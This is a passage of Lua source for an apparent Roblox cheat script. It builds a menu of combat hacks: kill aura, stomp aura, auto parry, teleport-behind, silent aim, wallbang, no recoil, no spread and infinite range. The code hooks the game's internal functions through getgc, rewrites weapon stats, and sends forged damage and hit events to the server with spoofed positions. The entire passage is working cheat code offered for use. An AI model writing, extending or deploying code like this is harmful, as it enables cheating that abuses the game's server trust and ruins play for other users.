    local Spins = main:Sector("Spins",'Right')
    Misc:Element("Toggle", "BHop")
    Autos:Element("Toggle", "Auto Equip")
    --Autos:Element("Toggle", "Auto Revive")
    --Autos:Element("Toggle", "Fast Respawn")
    combat:Element("Toggle", "Kill Aura")
    combat:Element("Dropdown", "Priority",{options = {'Distance','Health'}})    
	combat:Element("Slider", "Kill Aura Distance", {min = 0, max = 12, default = 12})
    combat:Element("Toggle", "Custom Kill Aura Distance")
    combat:Element("Slider", "Custom Distance", {min = 0, max = 1000, default = 600})
    combat:Element("Toggle", "Teleport Behind (for kill aura)")
    combat:Element("Slider", "Teleport Distance", {min = 0, max = 5, default = 5})
    combat:Element("Toggle", "Stomp Aura")
	combat:Element("Dropdown", "Stomp aura priority",{options = {'Distance','Health'}})
    combat:Element("Slider", "Stomp Aura Distance", {min = 0, max = 25, default = 25})
    combat:Element("Toggle", "Custom Stomp Aura Distance")
    combat:Element("Slider", "Custom Stomp Distance", {min = 0, max = 1000, default = 600})
	--[[randomtableidk = {}
	for _,v in pairs(game.Players:GetPlayers()) do 
		C.INSERT(randomtableidk, v.Name)
	end

	if #randomtableidk == 0 then
		C.INSERT(randomtableidk, 'none')
	end--]]
	combat:Element('lmao','Target',{options = loopkillplr})
	combat:Element('Toggle','Target player')
	--values.main.combat['Target player'].Toggle
    Spins:Element("Toggle", "Spin")
    Spins:Element("Slider", "Spin Power", {min = 0, max = 50, default = 50})
    Autos:Element("Toggle", "Auto Parry")
    Autos:Element("Slider", "Auto Parry Distance", {min = 0, max = 25, default = 10})
    Autos:Element("Slider", "Auto Parry Chance", {min = 0, max = 100, default = 100})
	local respawn = main:Sector('Respawn', 'Left')
	respawn:Element('Toggle', 'Fast Respawn')
	respawn:Element('Toggle', 'Auto spawn')
	--respawn:Element('Toggle', 'Respawn on death position')
	
	--respawn:Element('Toggle', 'Respawn when low hp')
	--respawn:Element('Slider', 'low hp', {min = 1, max = 100, default = 30})
    task.spawn( -- MODIFIED AUTO PARRY (from v3rm thanks to https://v3rmillion.net/showthread.php?tid=1129784)
        -- i did some coding tho its kinda different because it doesnt check for animations but it gets all animations
        function()
            function added(p)
                function balls(c)
                    local Humanoid = c:WaitForChild "Humanoid"
                    if Humanoid then
                        Humanoid.AnimationPlayed:Connect(
                            function(anim)
                                for i, v in pairs(weapon_anims) do
                                    if
                                        values.main.Autos["Auto Parry"].Toggle and
                                            anim.Animation.AnimationId == v
                                     then
                                        if values.main.Autos["Auto Parry Chance"].Slider >= 90 then
                                            if
                                                (LocalPlayer.Character ~= nil and
                                                    LocalPlayer.Character:FindFirstChild("Head") ~= nil and
                                                    p.Character:FindFirstChild("Head") ~= nil)
                                             then
                                                local mag =
                                                    (p.Character.Head.Position - LocalPlayer.Character.Head.Position).Magnitude
                                                if mag < values.main.Autos["Auto Parry Distance"].Slider then
                                                    parry()
                                                end
                                            end
                                        else
                                            local chance = math.random(1, 90)
                                            if chance >= values.main.Autos["Auto Parry Chance"].Slider then
                                                if
                                                    (LocalPlayer.Character ~= nil and
                                                        LocalPlayer.Character:FindFirstChild("Head") ~= nil and
                                                        p.Character:FindFirstChild("Head") ~= nil)
                                                 then
                                                    local mag =
                                                        (p.Character.Head.Position - LocalPlayer.Character.Head.Position).Magnitude
                                                    if mag < values.main.Autos["Auto Parry Distance"].Slider then
                                                        parry()
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        )
                    end
                end
                if p.Character then
                    balls(p.Character)
                end
                p.CharacterAdded:Connect(balls)
            end

            for i, v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer then
                    added(v)
                end
            end

            Players.PlayerAdded:Connect(added)
        end
    )
	task.spawn(function()
		game.RunService.RenderStepped:Connect(function()
			pcall(function()
                            local Closest
                            if values.main.combat["Custom Kill Aura Distance"].Toggle then
                                Closest = GetClosest(values.main.combat["Custom Distance"].Slider,values.main.combat["Priority"].Dropdown) or nil
							end
				if Closest ~= nil and Closest.Character and Closest.Character:FindFirstChild('HumanoidRootPart') then    
					local Weapon
					for i, v in pairs(LocalPlayer.Character:GetChildren()) do
						if v:IsA("Tool") then
							if v:FindFirstChild("Hitboxes") ~= nil then
								Weapon = v
							end
						end
					end
					if not Weapon then
					else
						if values.main.combat["Custom Kill Aura Distance"].Toggle then
							for i, v in pairs(Weapon:GetDescendants()) do
								if v:IsA "BasePart" then
									v.CFrame = Closest.Character.Head.CFrame
									v.Velocity =  Vector3.new(1000000000,100000000000,100000000000)
									v.CanCollide = false
									v.Massless = true												
															--v.Anchored = true
									if v:FindFirstChild "BodyVelocity" == nil then
										local boopyve = Instance.new("BodyVelocity")
										boopyve.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
										boopyve.P = math.huge
										boopyve.Velocity =  Vector3.new(1000000000,100000000000,100000000000)
										boopyve.Parent = v
									end
								end
								if v:IsA("Motor6D") then
									if v.Parent.Name == "Motor6Ds" then
											v:Destroy()
									end
								end
							end
						end
					end
				    elseif Closest == nil then
						local Weapon
						for i, v in pairs(LocalPlayer.Character:GetChildren()) do
							if v:IsA("Tool") then
								if v:FindFirstChild("Hitboxes") ~= nil then
									Weapon = v
								end
							end
						end
						if Weapon ~= nil then
                            for i, v in pairs(Weapon:GetDescendants()) do
                                if v:IsA "BasePart" then
                                    v.CFrame = LocalPlayer.Character.Head.CFrame
                                    v.Velocity = Vector3.new(1000000000,100000000000,100000000000)
                                    v.CanCollide = false
                                end
							end
                        end
					end
			end)
		end)
	end)
    task.spawn(
        function()
            while values.main.combat["Kill Aura"].Toggle do
               pcall(
                    function()
                        if values.main.combat["Kill Aura"].Toggle then
                            local Closest
                            if values.main.combat["Custom Kill Aura Distance"].Toggle then
                                Closest = GetClosest(values.main.combat["Custom Distance"].Slider,values.main.combat["Priority"].Dropdown) or nil
                            else
                                Closest = GetClosest(values.main.combat["Kill Aura Distance"].Slider,values.main.combat["Priority"].Dropdown) or nil
                            end
                            if Closest ~= nil and Closest.Character and Closest.Character:FindFirstChild('HumanoidRootPart') then
                                if Closest.Character:FindFirstChild("Humanoid").Health == 0 then
                                else
                                    if values.main.combat["Teleport Behind (for kill aura)"].Toggle then
                                        if not values.main.combat["Custom Kill Aura Distance"].Toggle then
                                            LocalPlayer.Character.HumanoidRootPart.CFrame =
                                                Closest.Character.HumanoidRootPart.CFrame *
                                                CFrame.new(0, 0, values.main.combat["Teleport Distance"].Slider)
                                        end
                                    end
                                    local Weapon
                                    for i, v in pairs(LocalPlayer.Character:GetChildren()) do
                                        if v:IsA("Tool") then
                                            if v:FindFirstChild("Hitboxes") ~= nil then
                                                Weapon = v
                                            end
                                        end
                                    end
                                    if not Weapon then
                                    else
										--repeat wait() until Weapon.Hitboxes:FindFirstChild('Hitbox')
                                        for i = 1,3 do
											if Closest.Character:FindFirstChild("SemiTransparentShield") and Closest.Character:FindFirstChild("SemiTransparentShield").Transparency == 1 and (not Closest.Character:FindFirstChild("SemiTransparentShield"):FindFirstChildWhichIsA('Sound')) then
	
											--task.wait(0.3)
											local args1 = {
												[1] = Weapon,
												[2] = i
											}

											events.MeleeSwing:FireServer(unpack(args1))
										
											events.MeleeDamage:FireServer(Weapon,Closest.Character.Head,Weapon.Hitboxes:FindFirstChild('Hitbox'),Weapon.Hitboxes:FindFirstChild('Hitbox').Position,CFrame.new(),Vector3.new(),Vector3.new())
											wait()
											end
										end
										wait(.4)
                                    end
                                end
                            elseif Closest == nil then
                                for i, v in pairs(Weapon:GetDescendants()) do
                                    if v:IsA "BasePart" then
                                        v.CFrame = LocalPlayer.Character.Head.CFrame
                                        v.Velocity = Vector3.new(1000000000,100000000000,100000000000)
                                        v.CanCollide = false
                                    end
                                end
                            end
                        end
                    end
                )
				--[[if not sucess then
					if response ~= nil then
						print(response)
					end
				end--]]
            end
        end
    )

    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        if values.main.combat["Stomp Aura"].Toggle then
                            local Closest
                            if values.main.combat["Custom Stomp Aura Distance"].Toggle then
                                Closest = GetClosest(values.main.combat["Custom Stomp Distance"].Slider,values.main.combat["Stomp aura priority"].Dropdown)
                            else
                                Closest = GetClosest(values.main.combat["Stomp Aura Distance"].Slider,values.main.combat["Stomp aura priority"].Dropdown)
                            end
                            if Closest then
                                if Closest.Character:FindFirstChild("Humanoid").Health == 0 then
                                else
                                    local Weapon = LocalPlayer.Character.Stomp
                                    if not Weapon then
                                    else
                                        if Closest.Character.Humanoid.Health <= 15 then
                                            if values.main.combat["Custom Stomp Aura Distance"].Toggle then
                                                for i, v in pairs(Weapon:GetDescendants()) do
                                                    if v:IsA "BasePart" then
                                                        v.CFrame = Closest.Character.HumanoidRootPart.CFrame
                                                        v.Velocity = Vector3.new(100000,100000,100000)
                                                        v.CanCollide = false
                                                        v.Massless = true
                                                        --v.Anchored = true
                                                        if v:FindFirstChild "BodyVelocity" == nil then
                                                            local boopyve = Instance.new("BodyVelocity")
                                                            boopyve.MaxForce =
                                                                Vector3.new(math.huge, math.huge, math.huge)
                                                            boopyve.P = math.huge
                                                            boopyve.Velocity = Vector3.new(100000,100000,100000)
                                                            boopyve.Parent = v
                                                        end
                                                    end
                                                    if v:IsA("Motor6D") then
                                                        if v.Parent.Name == "Motor6Ds" then
                                                            v:Destroy()
                                                        end
                                                    end
                                                end
                                            end

                                            local args1 = {
                                                [1] = Weapon,
                                                [2] = math.random(1,4)
                                            }

                                            events.MeleeSwing:FireServer(unpack(args1))
                                            task.wait(0.2)
											
                                            local rayOrigin = LocalPlayer.Character.HumanoidRootPart.Position
                                            local rayDirection = Vector3.new(0, 0, 5)
                                            local raycastParams = RaycastParams.new()
                                            raycastParams.IgnoreWater = true
                                            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                                            local raycastResult =
                                                workspace:Raycast(rayOrigin, rayDirection, raycastParams)
												
                                            local args = {
                                                [1] = Weapon,
                                                [2] = Closest.Character.Head,
                                                [3] = Weapon.Hitboxes.RightLegHitbox,
                                                [4] = Closest.Character.Head.Position,
                                                [5] = Closest.Character.Head.CFrame:ToObjectSpace(
                                                    CFrame.new(Closest.Character.Head.Position)
                                                ),
                                                [6] = raycastResult
                                            }

                                            events.MeleeDamage:FireServer(unpack(args))

                                            events.MeleeDamage:FireServer(unpack(args))
                                        end
                                    end
                                end
                            elseif Closest == nil then
                                for i, v in pairs(Weapon:GetDescendants()) do
                                    if v:IsA "BasePart" then
                                        v.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
                                        v.Velocity = Vector3.new(100000,100000,100000)
                                        v.CanCollide = false
                                    end
                                end
                            end
                        end
                    end
                )
            end
        end
    )

    task.spawn(
        function()
            game:GetService("RunService").RenderStepped:Connect(
                function()
                    pcall(
                        function()
                            for i, v in pairs(LocalPlayer.Backpack:GetChildren()) do
                                if v:IsA("Tool") then
                                    if v:FindFirstChild("Hitboxes") ~= nil then
                                        if values.main.Autos["Auto Equip"].Toggle then
                                            v.Parent = LocalPlayer.Character
                                        end
                                    end
                                end
                            end
                        end
                    )
                end
            )
        end
    )
    --print('task.spawn #3')
    --[[task.spawn(function()
        while task.wait() do
            --pcall(function()
                if values.main.Autos["Auto Revive"].Toggle then
                    if getState:getState().down.isDowned == true then
                        events.SelfReviveStart:FireServer()
						task.wait(.2)
                        events.SelfRevive:FireServer()
                    end
                end
            --end)
        end
    end)--]]
   -- print('task.spawn #4')
    task.spawn(function()
        while task.wait() do
            pcall(function()
                if values.main.Respawn["Fast Respawn"].Toggle then
                    if LocalPlayer.Character.Humanoid.Health == 0 then
						--if values.main.Respawn['Respawn on death position'].Toggle then
							--deathpos = LocalPlayer.Character.HumanoidRootPart.CFrame
						--end
						--events.SelfDamage:FireServer(150)
						task.wait(1)
                        events.StartFastRespawn:FireServer()
						task.wait(.2)
                        functions.CompleteFastRespawn:FireServer()
						if values.main.Respawn['Auto spawn'].Toggle then
							repeat wait() until game.Players.LocalPlayer.PlayerGui.RoactUI:FindFirstChild("MainMenu")
							functions.SpawnCharacter:FireServer()
							--task.wait(1)
							--[[if values.main.Respawn['Respawn on death position'].Toggle and deathpos then
								LocalPlayer.Character.HumanoidRootPart.CFrame = deathpos
							end--]]
						end
                    end
                end
            end)
        end
    end)
    --print('task.spawn #5')
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function() -- originally from outliers old source but i removed it and wrote a new one it kinda looks like the same but its a different one
                        if values.main.Spins["Spin"].Toggle then
                            if LocalPlayer.Character.HumanoidRootPart:FindFirstChild("spin") == nil then
                                local Spin = Instance.new("BodyAngularVelocity")
                                Spin.Name = "spin"
                                Spin.Parent = LocalPlayer.Character.HumanoidRootPart
                                Spin.MaxTorque = Vector3.new(0, math.huge, 0)
                                for i, v in (LocalPlayer.Character:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.Massless = true
                                        v.Velocity = Vector3.new(0, 0, 0)
                                    end
                                end
                            else
                                if LocalPlayer.Character.HumanoidRootPart:FindFirstChild("spin") ~= nil then
                                    LocalPlayer.Character.HumanoidRootPart.spin.AngularVelocity =
                                        Vector3.new(0, values.main.Spins["Spin Power"].Slider, 0)
                                end
                            end
                        else
                            if LocalPlayer.Character.HumanoidRootPart:FindFirstChild("spin") ~= nil then
                                LocalPlayer.Character.HumanoidRootPart.spin:Destroy()
                            end
                        end
                    end
                )
            end
        end
    )

    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        if values.main.Misc["BHop"].Toggle then
                            if LocalPlayer.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
                                LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            end
                        end
                    end
                )
            end
        end
    )--print('task.spawn #6')
task.spawn(function()
	getgenv().silent = main:Sector("Ranged sector", 'Right')
	silent:Element('Toggle', 'silent aim')
	silent:Element('ToggleTrans', 'Highlight target')
	silent:Element('ToggleTrans', 'Outline highlight target')
	silent:Element('ToggleColor', 'Silent aim info gui',{default = {Color = Color3.new(85, 170, 255)}})

	silent:Element('Dropdown', 'body part to hit', {options = {"Head","HumanoidRootPart","Torso","Left Leg","Right Leg","Left Arm","Right Arm"}})
	silent:Element('Slider','hitchance',{min = 1,max = 100,default = 100})
	silent:Element('Slider','hit distance',{min = 1,max = 25,default = 15})
	task.spawn(function()
		game.RunService.RenderStepped:Connect(function()
			if values.main['Ranged sector']['Highlight target'].Toggle or values.main['Ranged sector']['Outline highlight target'].Toggle then
				if not game.CoreGui:FindFirstChild('SilentAimTarget') then
					local highlight = C.INST('Highlight',game.CoreGui)
					highlight.Name = 'SilentAimTarget'
					
					highlight.FillColor = values.main['Ranged sector']['Highlight target'].Color
					highlight.FillTransparency = values.main['Ranged sector']['Highlight target'].Transparency
					if values.main['Ranged sector']['Outline highlight target'].Toggle then
						highlight.OutlineColor = values.main['Ranged sector']['Outline highlight target'].Color
						highlight.OutlineTransparency = values.main['Ranged sector']['Outline highlight target'].Transparency
					else
						highlight.OutlineTransparency = 1
					end
				elseif game.CoreGui:FindFirstChild('SilentAimTarget') then
					highlight = game.CoreGui:FindFirstChild('SilentAimTarget')
					--highlight.Name = 'SilentAimTarget'
					highlight.FillColor = values.main['Ranged sector']['Highlight target'].Color
					highlight.FillTransparency = values.main['Ranged sector']['Highlight target'].Transparency
					if values.main['Ranged sector']['Outline highlight target'].Toggle then
						highlight.OutlineColor = values.main['Ranged sector']['Outline highlight target'].Color
						highlight.OutlineTransparency = values.main['Ranged sector']['Outline highlight target'].Transparency
					else
						highlight.OutlineTransparency = 1
					end			
				end
			end
		end)
	end)


	local ARROW
	local shot = false
	local arrowsshooted = 0
	local Players = game.Players
	local mouse = LocalPlayer:GetMouse()
	local function getClosestToMouse() -- got this from cheese bcuz im too lazy again and yes he got from devforum
		local player, nearestDistance = nil, math.huge*9e9
		for i,v in pairs(Players:GetPlayers()) do
			if v ~= Players.LocalPlayer and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 and v.Character:FindFirstChild("HumanoidRootPart") then
				local root, visible = workspace.CurrentCamera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
				if visible then
					local distance = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(root.X, root.Y)).Magnitude

					if distance < nearestDistance then
						nearestDistance = distance
						player = v
					end
				end
			end
		end
		return player
	end
	workspace.EffectsJunk.ChildAdded:Connect(function(p)
		task.wait() -- yields to prevent some shit lol!
		if LocalPlayer.Character:FindFirstChildOfClass("Tool") == nil then
			shot = false
			return
		end
		local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
		if Tool:FindFirstChild("ClientAmmo") == nil then
			shot = false
			return
		end
		if (shot and p:IsA("MeshPart") and p:FindFirstChild("Tip") ~= nil) then
			ARROW = p
			Instance.new("SelectionBox",p).Adornee = p
			shot = false
		end
	end)

	for i,v in pairs(getgc(true)) do
		if typeof(v) == "table" and rawget(v,"shoot") then
			local Old = v.shoot
			v.shoot = function(tbl)
				shot = true
				arrowsshooted = tbl.shotIdx
				return Old(tbl)
			end
		end
		
		if typeof(v) == "table" and rawget(v,"calculateFireDirection") then
			old = v.calculateFireDirection
			v.calculateFireDirection = function(p3,p4,p5,p6)
				local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
				if Tool:FindFirstChild("ClientAmmo") == nil then
					return old(p3,p4,p5,p6)
				end
				if not values.main['Ranged sector']['silent aim'].Toggle then
					return old(p3,p4,p5,p6)
				end
					if shot then
						if not predicted then
							return old(p3,p4,p5,p6)
						else
							return predicted
						end
					end
				return old(p3,p4,p5,p6)
			end
		end
	end

	firehit = function(character,arrow)
		local fakepos = character[values.main['Ranged sector']['body part to hit'].Dropdown].Position + Vector3.new(math.random(1,5),math.random(1,5),math.random(1,5))
		local args = {
			[1] = LocalPlayer.Character:FindFirstChildOfClass("Tool"),
			[2] = character[values.main['Ranged sector']['body part to hit'].Dropdown],
			[3] = fakepos,
			[4] = character[values.main['Ranged sector']['body part to hit'].Dropdown].CFrame:ToObjectSpace(CFrame.new(fakepos)),
			[5] = fakepos * Vector3.new(math.random(1,5),math.random(1,5),math.random(1,5)),
			[6] = tostring(arrowsshooted)
		}
		game:GetService("ReplicatedStorage").Communication.Events.RangedHit:FireServer(unpack(args))
	end
	--local bruh = Instance.new("SelectionBox",workspace)
	--bruh.Color3 = Color3.fromRGB(163, 61, 54)
-- dev forum
local M = game.Players.LocalPlayer:GetMouse()
local Cam = game.Workspace.CurrentCamera
function WorldToScreen(Pos)
    local point = Cam.CoordinateFrame:pointToObjectSpace(Pos)
    local aspectRatio = M.ViewSizeX / M.ViewSizeY
    local hfactor = math.tan(math.rad(Cam.FieldOfView) / 2)
    local wfactor = aspectRatio*hfactor

    local x = (point.x/point.z) / -wfactor
    local y = (point.y/point.z) /  hfactor

    return Vector2.new(M.ViewSizeX * (0.5 + 0.5 * x), M.ViewSizeY * (0.5 + 0.5 * y))
end

local Prediction
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Aiming = Instance.new("TextLabel")
local Position = Instance.new("TextLabel")
local PredictionV = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.Name = 'Aiming real real'
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
Frame.Size = UDim2.new(0, 10, 0, 10)


UICorner.CornerRadius = UDim.new(10, 10)
UICorner.Parent = Frame

Aiming.Name = "Aiming"
Aiming.Parent = Frame
Aiming.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Aiming.BackgroundTransparency = 1.000
Aiming.BorderColor3 = Color3.fromRGB(27, 42, 53)
Aiming.Position = UDim2.new(-9.5, 0, 1.99999988, 0)
Aiming.Size = UDim2.new(0, 200, 0, 11)
Aiming.Font = Enum.Font.SpecialElite
Aiming.Text = "Aiming At: None"
Aiming.TextColor3 = Color3.fromRGB(255, 255, 255)
Aiming.TextSize = 14.000

Position.Name = "Position"
Position.Parent = Frame
Position.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Position.BackgroundTransparency = 1.000
Position.BorderColor3 = Color3.fromRGB(27, 42, 53)
Position.Position = UDim2.new(-9.5, 0, 3.99999988, 0)
Position.Size = UDim2.new(0, 200, 0, 11)
Position.Font = Enum.Font.SpecialElite
Position.Text = "Position: None"
Position.TextColor3 = Color3.fromRGB(255, 255, 255)
Position.TextSize = 14.000

PredictionV.Name = "PredictionV"
PredictionV.Parent = Frame
PredictionV.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PredictionV.BackgroundTransparency = 1.000
PredictionV.BorderColor3 = Color3.fromRGB(27, 42, 53)
PredictionV.Position = UDim2.new(-9.5, 0, 5.99999988, 0)
PredictionV.Size = UDim2.new(0, 200, 0, 11)
PredictionV.Font = Enum.Font.SpecialElite
PredictionV.Text = "Prediction Value: 0.01"
PredictionV.TextColor3 = Color3.fromRGB(255, 255, 255)
PredictionV.TextSize = 14.000

UIStroke.Thickness = 2
UIStroke.Parent = Frame
	task.spawn(function()
		RunService.RenderStepped:Connect(function()
			if values.main['Ranged sector']['silent aim'].Toggle and values.main['Ranged sector']['Silent aim info gui'].Toggle then
				if game.CoreGui:FindFirstChild("Aiming real real") then
					game.CoreGui:FindFirstChild('Aiming real real').Enabled = true
					game.CoreGui:FindFirstChild('Aiming real real').Frame.BackgroundColor3 = values.main['Ranged sector']['Silent aim info gui'].Color
				end
			else
				if game.CoreGui:FindFirstChild("Aiming real real") then
					game.CoreGui:FindFirstChild('Aiming real real').Enabled = false
				end			
			end
			PredictionV.Text = "Prediction Value: "..values.main['Ranged sector']['Prediction val'].Slider/100
			--[[if not values.main['Ranged sector']['silent aim'].Toggle then
				Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
			elseif getClosestToMouse() == nil then
				Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
			else
				pcall(function()
					local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
					if Tool:FindFirstChild("ClientAmmo") == nil then
						Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
					end				
				end)
			end--]]
		end)
	end)
	while wait() do
		pcall(function()
			if not LocalPlayer.Character:FindFirstChildOfClass('Tool') then
				Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
				Aiming.Text = "Aiming At: None"
				Position.Text = "Position: None"
				game.CoreGui:FindFirstChild('SilentAimTarget').Adornee = nil
			return 
		end
			local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			if Tool:FindFirstChild("ClientAmmo") == nil then
				Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
				Aiming.Text = "Aiming At: None"
				Position.Text = "Position: None"
				game.CoreGui:FindFirstChild('SilentAimTarget').Adornee = nil
				return
			end
			if not values.main['Ranged sector']['silent aim'].Toggle then
				Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
				Aiming.Text = "Aiming At: None"
				Position.Text = "Position: None"
				game.CoreGui:FindFirstChild('SilentAimTarget').Adornee = nil
				return
			end			
			local closest = getClosestToMouse() or nil
			if closest  ~= nil then
				if closest.Character and game.CoreGui:FindFirstChild('SilentAimTarget') then
					game.CoreGui:FindFirstChild('SilentAimTarget').Adornee = closest.Character
					--Frame.Transparency = 0
					Aiming.Text = "Aiming At: "..closest.Name
					PredictionV.Text = "Prediction Value: "..values.main['Ranged sector']['Prediction val'].Slider/100
					Prediction = closest.Character[values.main['Ranged sector']['body part to hit'].Dropdown].CFrame + (closest.Character[values.main['Ranged sector']['body part to hit'].Dropdown].Velocity * values.main['Ranged sector']['Prediction val'].Slider/100 + Vector3.new(0, .1, 0))
					predicted = (CFrame.lookAt(Tool.Contents.Handle.FirePoint.WorldCFrame.Position, Prediction.Position)).LookVector * 30;
					Position.Text = "Position: "..Prediction.Position.X..", "..Prediction.Y..", "..Prediction.Y
					local Vec = WorldToScreen(Prediction.Position)
					Frame.Position = UDim2.new(0,Vec.X,0,Vec.Y)				
				end
			else
				Frame.Position = UDim2.new(0.100260414, 0, 0.349072516, 0)
				Aiming.Text = "Aiming At: None"
				Position.Text = "Position: None"
				game.CoreGui:FindFirstChild('SilentAimTarget').Adornee = nil
			end
			if ARROW then
				if closest then
					if (ARROW.Position - closest.Character.HumanoidRootPart.Position).Magnitude <= values.main['Ranged sector']['hit distance'].Slider then
						if values.main['Ranged sector'].hitchance.Slider == 100 then
							firehit(closest.Character,ARROW)
							ARROW = nil
							shot = false
						else
							if math.random(1,100) >= values.main['Ranged sector'].hitchance.Slider then
								firehit(closest.Character,ARROW)
								ARROW = nil
								shot = false							
							end
						end
					end
				end
			end
		end)
	end




end)
		silent:Element('Toggle', 'Wallbang')
		task.spawn(function()
			while game.RunService.RenderStepped:Wait() do 
				if values.main['Ranged sector'].Wallbang.Toggle then
					game.CollectionService:AddTag(game:GetService("Workspace").Map,'RANGED_CASTER_IGNORE_LIST')	
					game.CollectionService:AddTag(game:GetService("Workspace").Terrain,'RANGED_CASTER_IGNORE_LIST')						
				else
					game.CollectionService:RemoveTag(game:GetService("Workspace").Map,'RANGED_CASTER_IGNORE_LIST')	
					game.CollectionService:RemoveTag(game:GetService("Workspace").Terrain,'RANGED_CASTER_IGNORE_LIST')		
				end		
			end
		end)
		rangedmods = Signal.new('rangedmods')
		rangedmods:Connect(function()
			for i,v in pairs(getgc(true)) do
				if typeof(v) == 'table' and rawget(v,'maxSpread') and rawget(v,'displayName') then
					if values.main['Ranged sector']['No recoil'].Toggle then
						--print('-------------------------------')
						
						
							randomstring = string.lower(v.displayName)
							--print(rangedvalues[randomstring]['recoilXMax'])
						--print(v.recoilXMax)
						--print('-------------------------------')
						--string = string..v.displayName..'\n'..rangedvalues[string.lower(v.displayName)].recoilXMax..'\n'..v.recoilXMax..'\n'..'-------------------------------'..'\n'
						v.recoilYMin = 0
						v.recoilZMin = 0
						v.recoilXMin = 0
						v.recoilYMax = 0
						v.recoilZMax = 0
						v.recoilXMax = 0
						--print('-------------------------------')
						print(v.recoilXMax)
						print(rangedvalues[string.lower(v.displayName)]['recoilXMax'])
						print('-------------------------------')
						--string = string..'\n'..rangedvalues[string.lower(v.displayName)].recoilXMax..'\n'..v.recoilXMax..'\n'..'-------------------------------'..'\n'
					else
					--table.foreach(rangedvalues[string.lower(v.displayName)],print)
						v.recoilYMin = rangedvalues[string.lower(v.displayName)]['recoilYMin']
						v.recoilZMin = rangedvalues[string.lower(v.displayName)]['recoilZMin']
						v.recoilXMin = rangedvalues[string.lower(v.displayName)]['recoilXMin']
						v.recoilYMax = rangedvalues[string.lower(v.displayName)]['recoilYMax']
						v.recoilZMax = rangedvalues[string.lower(v.displayName)]['recoilZMax']
						v.recoilXMax = rangedvalues[string.lower(v.displayName)]['recoilXMax']		
					end
					if values.main['Ranged sector']['No spread'].Toggle then
						v.minSpread = 0
						v.maxSpread = 0
					else
						v.minSpread = rangedvalues[string.lower(v.displayName)]['minSpread']
						v.maxSpread = rangedvalues[string.lower(v.displayName)]['maxSpread']
					end
					if values.main['Ranged sector']['Inf range'].Toggle then
						v.gravity = Vector3.new(0,0,0)
						v.maxDistance = 99999
					else
						v.gravity = rangedvalues[string.lower(v.displayName)]['gravity']
						v.maxDistance = rangedvalues[string.lower(v.displayName)]['maxDistance']			
					end
					if values.main['Ranged sector']['Instant charge'].Toggle then
						v.startShootingAfterCharge = true
						v.chargeOnDuration = 0
						v.chargeOffDuration = 0
					else
						v.startShootingAfterCharge = rangedvalues[string.lower(v.displayName)]['startShootingAfterCharge']
						v.chargeOnDuration = rangedvalues[string.lower(v.displayName)]['chargeOnDuration']
						v.chargeOffDuration = rangedvalues[string.lower(v.displayName)]['chargeOffDuration']
					end
				end
			end
		end)
		silent:Element('Slider', 'Prediction val', {min = 1,max = 100})
		silent:Element('Toggle', 'No recoil',{},function()
			rangedmods:Fire()
		end)
		silent:Element('Toggle', 'No spread',{},function()
			rangedmods:Fire()
		end)
		silent:Element('Toggle', 'Inf range',{},function()
			rangedmods:Fire()
		end)
		silent:Element('Toggle', 'Instant charge',{},function()
			rangedmods:Fire()
		end)
		silent:Element('Toggle', 'No reload cancel',{},function()
			rangedmods:Fire()
		end)
		silent:Element('Toggle', 'Always headshot',{},function()
			rangedmods:Fire()
		end)
		silent:Element('Toggle', 'Auto reload')
		for i,v in pairs(getgc(true)) do
			if typeof(v) == 'table' then
				--if rawget(v,'shotIdx') then
					if rawget(v,'startShooting') then
						task.spawn(function()
							local old = v.shoot
							--print('found')
							v.shoot = function(sex)
			
							old(sex)
							--getgenv().shoot = function() return sex:shoot() end
								if values.main['Ranged sector']['Auto reload'].Toggle then
									sex:reload()
								end
							end
						end)
					end
					
				--end
			end
		end

		--game.CollectionService:AddTag(game:GetService("Workspace").Map,'CAMERA_COLLISION_IGNORE_LIST')

		--[[task.spawn(function()
			while task.wait() do
				pcall(function()
					if game.Players.LocalPlayer.Character and values.maim['Ranged sector']['Instant charge'].Toggle then
						if game.Players.LocalPlayer.Character:FindFirstChild('Longbow') then
							for i,v in pairs(getconnections(game.Players.LocalPlayer.Character['Longbow'].ChargeProgressClient:GetPropertyChangedSignal("Value"))) do
								v:Disable()
							end            
							game.Players.LocalPlayer.Character['Longbow'].ChargeProgressClient.Value = 1
						elseif game.Players.LocalPlayer.Character:FindFirstChild('Heavy Bow') then
							for i,v in pairs(getconnections(game.Players.LocalPlayer.Character['Heavy Bow'].ChargeProgressClient:GetPropertyChangedSignal("Value"))) do
								v:Disable()
							end            
							game.Players.LocalPlayer.Character['Heavy Bow'].ChargeProgressClient.Value = 1
